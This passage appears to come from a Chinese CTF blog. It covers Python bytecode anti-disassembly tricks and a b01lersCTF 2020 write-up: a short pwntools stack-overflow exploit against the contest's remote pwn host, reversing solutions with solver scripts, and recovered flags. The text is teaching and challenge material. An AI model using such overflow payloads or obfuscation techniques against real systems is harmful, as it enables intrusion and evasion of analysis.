JUMP_ABSOLUTE            6  3 LOAD_CONST              65535   6 ...</code></pre><p>直接跳到了编号为6的位置，中间一句是不执行的，但是<code>dis</code>解析的时候会判断这句报错，因为不存在第65535项常量，这是条非法指令。但由于第一条绝对跳转的存在，第二条指令永远都不会被执行。通常的反汇编器如dis并不能理解实际执行的控制流，当反汇编器尝试反汇编第二条指令时，会去读取<code>co_const</code>的第65535项并且抛出一个异常。然后<code>dis</code>就会相应报错：</p><pre><code class="python">IndexError: tuple index out of range</code></pre><p>这比骗过IDA要容易得多</p><h5 id="虚假分支"><a href="#虚假分支" class="headerlink" title="虚假分支"></a>虚假分支</h5><p>合理设置条件，创造出很多程序不可能执行的分支，但是逆向者需要认真鉴别每一条分支是否被执行。</p><p>这不会使逆向者反汇编失败，但是会对分析造成极大的困难，就像是可恨的<a href="https://security.tencent.com/index.php/blog/msg/112">控制流平坦化</a>，属实劝退。</p><p><del>而且也没什么好办法，只能慢慢分析</del></p><h5 id="重叠指令"><a href="#重叠指令" class="headerlink" title="重叠指令"></a>重叠指令</h5><p>重叠指令在有变长指令的机器（如X86)上有广泛应用。直接在网上找了一些x86重叠指令：</p><pre><code class="asm">;单重叠00: EB 01           jmp  302: 68 c3 90 90 90  push 0x909090c3;实际执行00: EB 01           jmp  303: C3              retn</code></pre><pre><code class="asm">;多重叠指令00: EB02                    jmp  402: 69846A40682C104000EB02  imul eax, [edx + ebp*2 + 0102C6840], 0x002EB0040;实际执行00: EB02       jmp  404: 6A40       push 04006: 682C104000 push 0x40102C0B: EB02       jmp  0xF</code></pre><pre><code class="asm">;跳转至自身00: EBFF    jmp 102: C0C300  rol bl, 0;实际执行00: EBFF    jmp 101: FFC0    inc eax03: C3      retn</code></pre><p>在python上也同样适用</p><pre><code>0 JUMP_ABSOLUTE        [71 05 00]     5 3 NOP                   [09 -- --]4 LOAD_CONST           [64 64 00]     647 STOP_CODE            [00 -- --]</code></pre><p>一个简单的例子，进行了跳转之后，该位置是64，是有效指令所以读取了两个字节的操作数，实际上这段只执行了一句有效指令<code>LOAD_CONST 0</code></p><h5 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h5><p>现有的指令集是有定义的，但是如果有人修改了原有的定义，按照新的方式去赋值，就完全无法解析，遇见的不多，这样的情况似乎就只能通过函数的逻辑去猜测指令的意义</p><p><del>万恶的VM，万恶的出题人</del></p><h5 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h5><p>程序在循行开始的时候按照自己设定的加解密方式对真正的代码进行加密，然后再执行真正的代码部分，这样的方式利用python也可以实现</p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>本来是由一个题发散出来，结果写了很多，都只是一些个人的理解，整理整理才觉得还有很多需要学的东西。</p><p>解析的时候借用了一个国外大佬写的<code>dis</code>的代码，输出的层次很清晰，非常适合学习，<a href="http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html">原文</a>写的也很不错。</p><pre><code class="python">import dis, marshal, struct, sys, time, typesdef show_file(fname):    f = open(fname, &quot;rb&quot;)    magic = f.read(4)    moddate = f.read(4)    modtime = time.asctime(time.localtime(struct.unpack(&#39;I&#39;, moddate)[0]))    print &quot;magic %s&quot; % (magic.encode(&#39;hex&#39;))    print &quot;moddate %s (%s)&quot; % (moddate.encode(&#39;hex&#39;), modtime)    code = marshal.load(f)    show_code(code)def show_code(code, indent=&#39;&#39;):    print &quot;%scode&quot; % indent    indent += &#39;   &#39;    print &quot;%sargcount %d&quot; % (indent, code.co_argcount)    print &quot;%snlocals %d&quot; % (indent, code.co_nlocals)    print &quot;%sstacksize %d&quot; % (indent, code.co_stacksize)    print &quot;%sflags %04x&quot; % (indent, code.co_flags)    show_hex(&quot;code&quot;, code.co_code, indent=indent)    dis.disassemble(code)    print &quot;%sconsts&quot; % indent    for const in code.co_consts:        if type(const) == types.CodeType:            show_code(const, indent + &#39;   &#39;)        else:            print &quot;   %s%r&quot; % (indent, const)    print &quot;%snames %r&quot; % (indent, code.co_names)    print &quot;%svarnames %r&quot; % (indent, code.co_varnames)    print &quot;%sfreevars %r&quot; % (indent, code.co_freevars)    print &quot;%scellvars %r&quot; % (indent, code.co_cellvars)    print &quot;%sfilename %r&quot; % (indent, code.co_filename)    print &quot;%sname %r&quot; % (indent, code.co_name)    print &quot;%sfirstlineno %d&quot; % (indent, code.co_firstlineno)    show_hex(&quot;lnotab&quot;, code.co_lnotab, indent=indent)def show_hex(label, h, indent):    h = h.encode(&#39;hex&#39;)    if len(h) &lt; 60:        print &quot;%s%s %s&quot; % (indent, label, h)    else:        print &quot;%s%s&quot; % (indent, label)        for i in range(0, len(h), 60):            print &quot;%s   %s&quot; % (indent, h[i:i + 60])show_file(sys.argv[1])</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> python </tag>
            
            <tag> opcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>b01lersCTF-2020-wp</title>
      <link href="/2020/03/16/b01lersCTF-2020-wp/"/>
      <url>/2020/03/16/b01lersCTF-2020-wp/</url>
      
        <content type="html"><![CDATA[<p>这个比赛还算友好，而且少见的逆向比web还要多，出题人说之后会放源码和官方writeup，是个不错的学习的机会，这里把做出来的几道题先写一下（然后开始写作业……</p><span id="more"></span><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Welcome-to-Earth"><a href="#Welcome-to-Earth" class="headerlink" title="Welcome to Earth"></a>Welcome to Earth</h4><p>我对web实际上是毫无兴趣的，但这题实在简单的过分，还是给做了，详细的就不说了，查看源码就可以发现，只要在调用<code>dead</code>之前进入到应该进去的页面就可以了（直接<code>F12</code>里debug暂停然后慢慢看就可以了……</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>pwn也很久没做了，知识点还停留在刚学的时候，应付一下第一题就完事了</p><h4 id="Department-of-Flying-Vehicles"><a href="#Department-of-Flying-Vehicles" class="headerlink" title="Department of Flying Vehicles"></a>Department of Flying Vehicles</h4><p>IDA打开<del>(逆向看久了之后发现pwn题目的逻辑真的是简单得要命)</del>，漏洞也看得出来，利用的话还是不熟练，需要多练</p><pre><code class="c++">__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  __int64 v3; // rax  char s1[8]; // [rsp+0h] [rbp-20h]  __int64 v6; // [rsp+8h] [rbp-18h]  __int64 v7; // [rsp+10h] [rbp-10h]  unsigned __int64 v8; // [rsp+18h] [rbp-8h]  v8 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  v6 = 1176165807576793170LL;  v7 = 1154282520852565777LL;  puts(&quot;Dave has ruined our system. He updated the code, and now he even has trouble checking his own liscense!&quot;);  puts(&quot;If you can please make it work, we&#39;ll reward you!\n&quot;);  puts(&quot;Welcome to the Department of Flying Vehicles.&quot;);  printf(&quot;Which liscense plate would you like to examine?\n &gt; &quot;, 0LL);  gets(s1);  if ( v6 == (v7 ^ *(_QWORD *)s1) )  &#123;    if ( !strncmp(s1, &quot;COOLDAV&quot;, 8uLL) )    &#123;      puts(&quot;Hi Dave!&quot;);    &#125;    else    &#123;      v3 = sub_96A(&quot;flag.txt&quot;, &quot;COOLDAV&quot;);      printf(&quot;Thank you so much! Here&#39;s your reward!\n%s&quot;, v3);    &#125;  &#125;  else  &#123;    puts(&quot;Error.&quot;);  &#125;  return 0LL;&#125;</code></pre><p>如果想要通过第一个if就必须要输入<code>COOLDAV</code>，这样的话就过不了第二个输入，看到<code>gets</code>直接考虑溢出覆盖变量的值，最简单的方法就是输入和其中的一个变量全都为<code>\0</code></p><pre><code class="python">from pwn import *# io=process(&#39;./dfv&#39;)io=remote(&#39;pwn.ctf.b01lers.com&#39;,1001)io.recvuntil(&#39;Which liscense plate would you like to examine?\n &gt; &#39;)payload=4*p64(0)io.sendline(payload)io.interactive()</code></pre><p>就可以拿到flag<del>(但我忘了记录flag得值又懒得再跑一遍拿flag)</del></p><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="Chugga-Chugga"><a href="#Chugga-Chugga" class="headerlink" title="Chugga Chugga"></a>Chugga Chugga</h4><p>IDA打开</p><pre><code class="c++">void __fastcall __noreturn main_main(__int64 a1, __int64 a2)&#123;  signed __int64 i; // rcx  __int64 v3; // r8  __int64 v4; // r9  __int64 v5; // r8  __int64 v6; // r9  __int64 v7; // r8  __int64 v8; // r9  __int64 v9; // r8  __int64 v10; // r9  unsigned __int64 v11; // rcx  _BYTE *v12; // rdx  signed __int64 v13; // rax  char v14; // bl  char v15; // r10  int v16; // er11  char v17; // r12  char v18; // r13  int v19; // er13  int v20; // er14  int v21; // ecx  int v22; // er14  char v23; // cl  unsigned int v24; // er13  char v25; // r11  char v26; // r12  _QWORD *v27; // [rsp+8h] [rbp-A0h]  signed __int64 v28; // [rsp+40h] [rbp-68h]  _QWORD *v29; // [rsp+48h] [rbp-60h]  __int128 v30; // [rsp+50h] [rbp-58h]  __int128 v31; // [rsp+60h] [rbp-48h]  __int128 v32; // [rsp+70h] [rbp-38h]  __int128 v33; // [rsp+80h] [rbp-28h]  __int128 v34; // [rsp+90h] [rbp-18h]  if ( (unsigned __int64)&amp;v33 &lt;= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) )    runtime_morestack_noctxt();  runtime_newobject(a1, a2);  v29 = v27;  for ( i = 0LL; ; i = v13 )  &#123;    v28 = i;    runtime_convT64(a1, a2);    *(_QWORD *)&amp;v33 = &amp;unk_4A4C40;    *((_QWORD *)&amp;v33 + 1) = &amp;main_statictmp_2;    *(_QWORD *)&amp;v34 = &amp;unk_4A4480;    *((_QWORD *)&amp;v34 + 1) = v27;    a2 = (__int64)&amp;go_itab__os_File_io_Writer;    fmt_Fprintln(      a1,      (__int64)&amp;go_itab__os_File_io_Writer,      (__int64)&amp;main_statictmp_2,      (__int64)&amp;unk_4A4C40,      v3,      v4,      (__int64)&amp;go_itab__os_File_io_Writer,      os_Stdout);    *(_QWORD *)&amp;v32 = &amp;unk_4A4C40;    *((_QWORD *)&amp;v32 + 1) = &amp;main_statictmp_3;    fmt_Fprintln(      a1,      (__int64)&amp;go_itab__os_File_io_Writer,      (__int64)&amp;v32,      (__int64)&amp;main_statictmp_3,      v5,      v6,      (__int64)&amp;go_itab__os_File_io_Writer,      os_Stdout);    *(_QWORD *)&amp;v31 = &amp;unk_4A1DC0;    *((_QWORD *)&amp;v31 + 1) = v29;    fmt_Fscan(      a1,      (__int64)&amp;go_itab__os_File_io_Writer,      (__int64)&amp;v31,      (__int64)v29,      v7,      v8,      (__int64)&amp;go_itab__os_File_io_Reader,      os_Stdin);    v11 = v29[1];    v12 = (_BYTE *)*v29;    if ( v11 &lt;= 2 )      break;    if ( v12[2] != 116 )      goto LABEL_39;    if ( v11 &lt;= 9 )      break;    a2 = (unsigned __int8)v12[9];    if ( (_BYTE)a2 != 99 )      goto LABEL_39;    if ( v11 &lt;= 0x10 )      break;    a1 = (unsigned __int8)v12[16];    if ( (_BYTE)a1 != 110 )      goto LABEL_39;    if ( v11 &lt;= 0x15 )      break;    v9 = (unsigned __int8)v12[21];    if ( (_BYTE)v9 != 122 )      goto LABEL_39;    if ( v11 &lt;= 0x16 )      break;    if ( v12[22] != 125 )      goto LABEL_39;    v10 = (unsigned __int8)v12[5];    if ( 115 != (_BYTE)v10 )      goto LABEL_39;    if ( (v12[3] ^ 0x74) != 18 )      goto LABEL_39;    v14 = v12[1];    if ( v14 != 99 )      goto LABEL_39;    a2 = (unsigned __int8)v12[7];    if ( (_BYTE)a2 != 100 )      goto LABEL_39;    v15 = v12[13];    if ( v12[12] != v15 )      goto LABEL_39;    if ( 122 != v12[19] )      goto LABEL_39;    v9 = (unsigned __int8)v12[14];    v16 = (unsigned __int8)v12[6];    if ( (_BYTE)v16 + (_BYTE)v9 != 104 )      goto LABEL_39;    v17 = v12[4];    if ( 123 != v17 )      goto LABEL_39;    v18 = v12[8];    if ( v12[15] != v18 )      goto LABEL_39;    if ( v18 + 4 != v14 )      goto LABEL_39;    v19 = (unsigned __int8)v12[17];    v20 = (unsigned __int8)v12[11];    if ( 125 - (_BYTE)v19 + 40 != (_BYTE)v20 )      goto LABEL_39;    v21 = (unsigned __int8)v12[18];    v22 = v19 + v20 - v10 - v21;    v23 = v21 - v19;    if ( (_BYTE)v22 != v23      || (v24 = v16 - v19, *v12 != v23 * ((unsigned __int8)v24 &gt;&gt; 1) + 110)      || (v25 = v12[10], v15 + 1 != v25)      || (v26 = v17 - a2, a2 = v24, (_BYTE)v24 + 2 * (_BYTE)v24 + 4 * v26 != v25)      || v12[20] - v14 != 2 * v23      || (v10 = (unsigned int)a1 ^ (unsigned int)v10, (_BYTE)v10 != 29)      || (_BYTE)v24 != 4 * v23      || v12[6] != (_BYTE)v9 )    &#123;LABEL_39:      *(_QWORD *)&amp;v30 = &amp;unk_4A4C40;      *((_QWORD *)&amp;v30 + 1) = &amp;main_statictmp_4;      fmt_Fprintln(        a1,        a2,        (__int64)&amp;v30,        (__int64)&amp;main_statictmp_4,        v9,        v10,        (__int64)&amp;go_itab__os_File_io_Writer,        os_Stdout);      v13 = v28 + 1;    &#125;    else    &#123;      main_win();      v13 = v28;    &#125;  &#125;  runtime_panicindex(a1, a2, v12);&#125;</code></pre><p>所有的判断条件都在这个函数里，直接根据条件解出来flag就可以了，至于为什么不写具体的过程，因为我是在演草纸上自己动手解的方程，只要耐心分析就可以了</p><blockquote><p>这里有一个疑问，标记一下，解方程的时候可以解出来两解，应该有地方可以排除掉，但我直接根据语义选择的flag</p></blockquote><pre><code>pctf&#123;s4d_chugg4_n01zez&#125;</code></pre><h4 id="Dank-Engine"><a href="#Dank-Engine" class="headerlink" title="Dank Engine"></a>Dank Engine</h4><p>脑洞题<del>(这游戏根本就玩不过去……</del></p><p>走到地图中间怎么都跳不上去，到了最右边发现不能走了但是地图没完，后面接着长长的一条路，所以一直往右边拉，看到<code>pctf</code>，找到了flag的位置</p><p><del>(然后为了找flag跑崩了四次虚拟机……显卡和cpu看样8太行)</del></p><p>用鼠标上下没法超出屏幕，用<code>alt+f7</code>移动窗口慢慢找，感觉应该有逆向方法，那个pck包我至今还没解开</p><pre><code>PCTF&#123;ITWASTIMEFORTHOMASTOGO_HEHADSEENEVERYTHING&#125;</code></pre><hr><p>来补充一下，IDA可以直接打开pck包，里面有关于人物的设定</p><pre><code>&#39;# Global Variables&#39;,0Ahseg000:0000000000004610                 db &#39;var g_direction&#39;,0Ahseg000:0000000000004610                 db &#39;var g_velocity&#39;,0Ahseg000:0000000000004610                 db &#39;var g_parent&#39;,0Ahseg000:0000000000004610                 db &#39;var g_airborne&#39;,0Ahseg000:0000000000004610                 db &#39;var g_delta&#39;,0Ahseg000:0000000000004610                 db &#39;var g_cheat_stack&#39;,0Ahseg000:0000000000004610                 db &#39;var g_god_mode&#39;,0Ah</code></pre><p>惊奇的发现下面还有一个上帝模式和开启方法</p><pre><code> db 9,&#39;if self.g_cheat_stack == [&quot;P&quot;, &quot;U&quot;, &quot;R&quot;, &quot;G&quot;, &quot;0&quot;, &quot;0&quot;]:&#39;,0Ahseg000:0000000000004610                 db 9,9,&#39;self.g_god_mode = not self.g_god_mode&#39;,0Ahseg000:0000000000004610                 db 9,9,&#39;$CollisionShape2D.disabled = not $CollisionShape2D.disabled&#39;,0Ah</code></pre><p>方法就是按键直接输入<code>PURG00</code>，打开之后就可以飞和穿墙，直接跑到flag在的地方去看就可以了</p><p><del>(亏我还调窗口大小调了这么久)</del></p><h4 id="Digital-Sloth"><a href="#Digital-Sloth" class="headerlink" title="Digital Sloth"></a>Digital Sloth</h4><p>这题的逻辑很简单</p><pre><code class="c++">__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  signed int v3; // esi  signed __int64 v4; // rdx  signed __int64 v5; // r12  int *v6; // r13  __int64 v7; // rax  signed __int64 v8; // rbp  unsigned __int64 v9; // rdx  signed int v10; // eax  int v11; // edi  int v12; // ecx  __int64 v14; // [rsp+0h] [rbp-68h]  __int64 v15; // [rsp+8h] [rbp-60h]  __int64 v16; // [rsp+10h] [rbp-58h]  __int64 v17; // [rsp+18h] [rbp-50h]  __int64 v18; // [rsp+20h] [rbp-48h]  __int64 v19; // [rsp+28h] [rbp-40h]  int v20; // [rsp+30h] [rbp-38h]  int v21; // [rsp+34h] [rbp-34h]  unsigned __int64 v22; // [rsp+38h] [rbp-30h]  v3 = 51;  v4 = 3LL;  v5 = 113LL;  v22 = __readfsqword(0x28u);  v20 = 1422670297;  v14 = -3319278099595541965LL;  v6 = (int *)((char *)&amp;v14 + 1);  v15 = -422936419575592362LL;  v16 = -4095196370651919852LL;  v17 = 8155891993347461205LL;  v18 = 2743091852077296222LL;  v19 = -5317187183026317550LL;  while ( 1 )  &#123;    v7 = 0LL;    v8 = 1LL;    if ( v4 )    &#123;      do      &#123;        ++v7;        v8 *= v5;      &#125;      while ( v7 != v4 );    &#125;    v9 = v8;    v10 = 8;    v11 = 0;    do    &#123;      v12 = (unsigned __int8)v9;      v9 &gt;&gt;= 8;      v11 ^= v12;      --v10;    &#125;    while ( v10 );    _IO_putc(v3 ^ v11, stdout);    fflush(stdout);    if ( &amp;v21 == v6 )      break;    v3 = *(unsigned __int8 *)v6;    v4 = v5;    v6 = (int *)((char *)v6 + 1);    v5 = v8;  &#125;  return 0LL;&#125;</code></pre><p>直接会输出flag的那种，但是一运行只输出了三个字符，明显是计算大数乘幂的时候算法时间复杂度太高了(<strong>O(n^2)</strong>)，想要算出flag必须手动优化一下算法，利用平方把时间复杂度优化到**O(logn)**，在大数的时候明显优化的不是一点</p><pre><code class="c++">#include &lt;iostream&gt;using namespace std;typedef unsigned long long ull;ull qpow(ull x, ull n) &#123;    ull res = 1;    ull mod = 0xffffffffffffffff;    while (n) &#123;        if (n &amp; 1)            res = res * x &amp; mod;    //如果二进制最低位为1，则乘上x^(2^i)        x = x * x &amp; mod;        n &gt;&gt;= 1;    &#125;    return res;&#125;int main() &#123;    ull v4; // rdx    ull v5; // r12    ull v8; // rbp    ull v9; // rdx    signed int v10; // eax    int v11; // edi    int v12; // ecx    v4 = 3;    v5 = 113;    int v3[] = &#123;0x33, 0xC2, 0xDF, 0x9A, 0x27, 0x8E, 0xEF, 0xD1, 0x56, 0x0A, 0x9F, 0x34, 0x91, 0x6D, 0x21, 0xFA,                0x14, 0xCA, 0xD2, 0x21, 0x99, 0xF0, 0x2A, 0xC7, 0x55, 0x90, 0xED, 0x61, 0x8E, 0x8C, 0x2F, 0x71,                0x5E, 0xEA, 0x55, 0x85, 0x81, 0x6B, 0x11, 0x26, 0x12, 0xD7, 0x74, 0xBF, 0x6D, 0x8E, 0x35, 0xB6,                0xD9, 0x39, 0xCC, 0x54&#125;;    for (int i = 0; i &lt; 52; i++) &#123;        v8 = 1;        if (v4) &#123;            v8 *= qpow(v5, v4);        &#125;        v9 = v8;        v10 = 8;        v11 = 0;        do &#123;            v12 = v9 &amp; 0xff;            v9 &gt;&gt;= 8;            v11 ^= v12;            --v10;        &#125; while (v10);        char tmp=v3[i] ^ v11;        cout &lt;&lt; tmp;        v4 = v5;        v5 = v8;    &#125;    return 0;&#125;</code></pre><hr><p>又是一道分割线，看了其它大佬的wp才知道……直接用python的<code>pow</code>不就好了……</p><p>直接输出flag</p><pre><code>pctf&#123;one man&#39;s trash is another man&#39;s V#x0GFu_Lp%3&#125;</code></pre><p><del>看到最后一段甚至感觉做错了，到现在没看懂</del></p><h4 id="train-arms"><a href="#train-arms" class="headerlink" title="train_arms"></a>train_arms</h4><p><del>arm一语双关，妙啊</del></p><p>这题就直接看汇编了</p><pre><code class="asm">.cpu cortex-m0.thumb.syntax unified.fpu softvfp.data     flag: .string &quot;REDACTED&quot; //len = 28.text.global mainmain:    ldr r0,=flag    eors r1,r1    eors r2,r2    movs r7,#1                ; r7=1    movs r6,#42                ; r6=42loop:    ldrb r2,[r0,r1]    cmp r2,#0    beq exit    lsls r3,r1,#0    ands r3,r7                ; 区分奇偶位    cmp r3,#0    bne f1//if odd    strb r2,[r0,r1]    adds r1,#1    b loopf1:    eors r2,r6    strb r2,[r0,r1]    adds r1,#1    b loopexit:    wfi</code></pre><p>虽然没怎么接触过arm的汇编，但是这里还是很容易的，把flag分奇偶位进行操作，奇数位不动，偶数位异或42，最终结果输出到文件，所以打开文件</p><pre><code>7049744c7b5e721e31447375641a6e5e5f42345c337561586d597d</code></pre><p>明显16进制输出，写个脚本跑一下</p><pre><code class="python">target = [0x70, 0x49, 0x74, 0x4c, 0x7b, 0x5e, 0x72, 0x1e, 0x31, 0x44, 0x73, 0x75, 0x64, 0x1a, 0x6e, 0x5e, 0x5f, 0x42,          0x34, 0x5c, 0x33, 0x75, 0x61, 0x58, 0x6d, 0x59, 0x7d]flag = &#39;&#39;for i in range(len(target)):    if i &amp; 1:        flag += chr(target[i] ^ 42)    else:        flag += chr(target[i])print(flag)</code></pre><p>直接输出flag</p><pre><code>pctf&#123;tr41ns_d0nt_h4v3_arms&#125;</code></pre><h4 id="Little-Engine"><a href="#Little-Engine" class="headerlink" title="Little Engine"></a>Little Engine</h4><blockquote><p>我觉得这题很不错，难度比较适中，还可以加深对于数据在内存中占用位数的理解</p></blockquote><pre><code class="c++">__int64 __usercall main@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, char **a2@&lt;rsi&gt;, char **a3@&lt;rdx&gt;, __int64 a4@&lt;rbx&gt;, _QWORD *a5@&lt;r12&gt;)&#123;  signed __int64 v5; // rdx  unsigned __int64 v6; // rcx  const char *v7; // rsi  __int64 v8; // rdx  __int64 v9; // rcx  __int64 v10; // rdi  __int64 v12; // [rsp+0h] [rbp-28h]  unsigned __int64 v13; // [rsp+18h] [rbp-10h]  __asm &#123; endbr64 &#125;  v13 = __readfsqword(0x28u);  sub_16B0(a1, a2, a3);  sub_1830(&amp;v12);  sub_1510(v5, v6, a4, &amp;v12, &amp;v12, (unsigned __int64)a2, a5);  if ( (unsigned __int8)sub_15A0(&amp;v12) )  &#123;    v7 = &quot;Chugga chugga choo choo you&#39;re the little engine that CAN!&quot;;    sub_11F0(&amp;std::cout, &quot;Chugga chugga choo choo you&#39;re the little engine that CAN!&quot;, 58LL);  &#125;  else  &#123;    v7 = &quot;I guess you don&#39;t know anything about trains...go do some TRAINing you non-conductor :(&quot;;    sub_11F0(      &amp;std::cout,      &quot;I guess you don&#39;t know anything about trains...go do some TRAINing you non-conductor :(&quot;,      87LL);  &#125;  sub_1170(&amp;std::cout);  v10 = v12;  if ( v12 )    sub_11C0(v12, v7, v8, v9);  if ( __readfsqword(0x28u) != v13 )  &#123;    sub_11E0(v10, v7, v8, v9);    __asm &#123; endbr64 &#125;    JUMPOUT(&amp;loc_12D1);  &#125;  return 0LL;&#125;</code></pre><p>话好多，第一句说明正确，第二句说明错误，逻辑就很清楚了，if的条件是一个用来判断的函数</p><p>程序在<code>sub_1830()</code>里进行输入，在<code>sub_1510()</code>进行了一些处理然后判断</p><pre><code class="c++">__int64 *__fastcall sub_1830(__int64 *a1)&#123;  __int64 *v1; // r12  unsigned __int64 v2; // rsi  unsigned __int8 *v3; // rdx  __int64 v4; // rcx  __int64 v5; // rbx  __int64 v6; // r13  __int64 v7; // rax  char *v8; // rdi  char *v9; // r8  __int64 v10; // rdx  _BYTE *v11; // rax  char *v13; // [rsp+0h] [rbp-58h]  __int64 v14; // [rsp+8h] [rbp-50h]  char v15; // [rsp+10h] [rbp-48h]  unsigned __int64 v16; // [rsp+28h] [rbp-30h]  __asm &#123; endbr64 &#125;  v1 = a1;  v16 = __readfsqword(0x28u);  sub_11F0(&amp;std::cout, &quot;Now, I hope you&#39;re a total trainiac. Give me your best tidbit: &quot;, 63LL);  v2 = (unsigned __int64)&amp;v13;  v13 = &amp;v15;  v14 = 0LL;  v15 = 0;  sub_1220(&amp;std::cin, &amp;v13);  v5 = v14;  v6 = (__int64)v13;  a1[2] = 0LL;  *(_OWORD *)a1 = 0LL;  if ( v5 &lt; 0 )  &#123;LABEL_32:    sub_1190(&quot;cannot create std::vector larger than max_size()&quot;);    __asm &#123; endbr64 &#125;    JUMPOUT(&amp;loc_12AA);  &#125;  if ( v5 )  &#123;    v7 = sub_11D0(v5);    v8 = (char *)(v7 + v5);    *v1 = v7;    v9 = v13;    v1[2] = v7 + v5;    if ( (unsigned __int64)(v6 + 15 - v7) &lt;= 0x1E || (unsigned __int64)(v5 - 1) &lt;= 0xE )    &#123;      v3 = 0LL;      do      &#123;        v4 = v3[v6];        (v3++)[v7] = v4;      &#125;      while ( (unsigned __int8 *)v5 != v3 );    &#125;    else    &#123;      v10 = 0LL;      do      &#123;        *(__m128i *)(v7 + v10) = _mm_loadu_si128((const __m128i *)(v6 + v10));        v10 += 16LL;      &#125;      while ( v10 != (v5 &amp; 0xFFFFFFFFFFFFFFF0LL) );      v2 = v5 &amp; 0xFFFFFFFFFFFFFFF0LL;      v4 = v5 &amp; 0xF;      v3 = (unsigned __int8 *)(v6 + (v5 &amp; 0xFFFFFFFFFFFFFFF0LL));      v11 = (_BYTE *)((v5 &amp; 0xFFFFFFFFFFFFFFF0LL) + v7);      if ( v5 != (v5 &amp; 0xFFFFFFFFFFFFFFF0LL) )      &#123;        v2 = *v3;        *v11 = v2;        if ( v4 != 1 )        &#123;          v2 = v3[1];          v11[1] = v2;          if ( v4 != 2 )          &#123;            v2 = v3[2];            v11[2] = v2;            if ( v4 != 3 )            &#123;              v2 = v3[3];              v11[3] = v2;              if ( v4 != 4 )              &#123;                v2 = v3[4];                v11[4] = v2;                if ( v4 != 5 )                &#123;                  v2 = v3[5];                  v11[5] = v2;                  if ( v4 != 6 )                  &#123;                    v2 = v3[6];                    v11[6] = v2;                    if ( v4 != 7 )                    &#123;                      v2 = v3[7];                      v11[7] = v2;                      if ( v4 != 8 )                      &#123;                        v2 = v3[8];                        v11[8] = v2;                        if ( v4 != 9 )                        &#123;                          v2 = v3[9];                          v11[9] = v2;                          if ( v4 != 10 )                          &#123;                            v2 = v3[10];                            v11[10] = v2;                            if ( v4 != 11 )                            &#123;                              v2 = v3[11];                              v11[11] = v2;                              if ( v4 != 12 )                              &#123;                                v2 = v3[12];                                v11[12] = v2;                                if ( v4 != 13 )                                &#123;                                  v2 = v3[13];                                  v11[13] = v2;                                  if ( v4 != 14 )                                  &#123;                                    v3 = (unsigned __int8 *)v3[14];                                    v11[14] = (_BYTE)v3;                                  &#125;                                &#125;                              &#125;                            &#125;                          &#125;                        &#125;                      &#125;                    &#125;                  &#125;                &#125;              &#125;            &#125;          &#125;        &#125;      &#125;    &#125;  &#125;  else  &#123;    v9 = (char *)v6;    v8 = 0LL;  &#125;  v1[1] = (__int64)v8;  if ( v9 != &amp;v15 )  &#123;    v8 = v9;    sub_11C0(v9, v2, v3, v4);  &#125;  if ( __readfsqword(0x28u) != v16 )  &#123;    sub_11E0(v8, v2, v3, v4);    goto LABEL_32;  &#125;  return v1;&#125;</code></pre><p>程序看起来异常复杂，但是经过我的仔细分(tiao)析(shi)，发现只是把输入拷贝到了内存里分配好的空间。</p><pre><code class="c++">__int64 __usercall sub_1510@&lt;rax&gt;(signed __int64 a1@&lt;rdx&gt;, unsigned __int64 a2@&lt;rcx&gt;, __int64 a3@&lt;rbx&gt;, void *a4@&lt;rbp&gt;, __int64 *a5@&lt;rdi&gt;, unsigned __int64 a6@&lt;rsi&gt;, _QWORD *a7@&lt;r12&gt;)&#123;  _QWORD *v7; // rax  __int64 v8; // rdx  __int64 v9; // rcx  __int64 v10; // rdx  __int64 v11; // rcx  __int64 v12; // rdx  __int64 v13; // rcx  char **v14; // rdx  __int64 v15; // rax  _BYTE *v16; // rax  __int64 v17; // rcx  __int64 v18; // rcx  __int64 result; // rax  unsigned __int64 v20; // rt1  unsigned __int64 v21; // [rsp+18h] [rbp-10h]  void *retaddr; // [rsp+28h] [rbp+0h]  __asm &#123; endbr64 &#125;  v21 = __readfsqword(0x28u);  v15 = *a5;  if ( *a5 == a5[1] )  &#123;LABEL_5:    v20 = __readfsqword(0x28u);    result = v20 ^ v21;    if ( v20 != v21 )    &#123;      sub_11E0(a5, a6, a1, a2);      result = sub_15A0(a5);    &#125;  &#125;  else  &#123;    a6 = 0LL;    a1 = 4294967185LL;    while ( 1 )    &#123;      v16 = (_BYTE *)(a6 + v15);      v17 = (unsigned __int8)*v16;      if ( (_BYTE)v17 == 10 )        break;      *v16 = a1 ^ v17;      v18 = (unsigned __int8)a1 + a6++;      v15 = *a5;      a1 = (unsigned int)v18         + (unsigned int)((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v18 &gt;&gt; 64) &gt;&gt; 7);      a2 = a5[1] - *a5;      if ( a6 &gt;= a2 )        goto LABEL_5;    &#125;    v7 = (_QWORD *)sub_1180(8LL, a6, a1, v17, -9187201950435737471LL);    *v7 = &amp;unk_3CD0;    sub_1250(v7, &amp;`typeinfo for&#39;std::exception, &amp;std::exception::~exception);    sub_11C0(a4, &amp;`typeinfo for&#39;std::exception, v8, v9);    sub_1260(a7);    if ( *a7 )      sub_11C0(*a7, &amp;`typeinfo for&#39;std::exception, v10, v11);    if ( retaddr != a4 )      sub_11C0(retaddr, &amp;`typeinfo for&#39;std::exception, v10, v11);    sub_1260(a3);    if ( retaddr )      sub_11C0(retaddr, &amp;`typeinfo for&#39;std::exception, v12, v13);    sub_1260(a4);    result = main((__int64)a4, (char **)&amp;`typeinfo for&#39;std::exception, v14);  &#125;  return 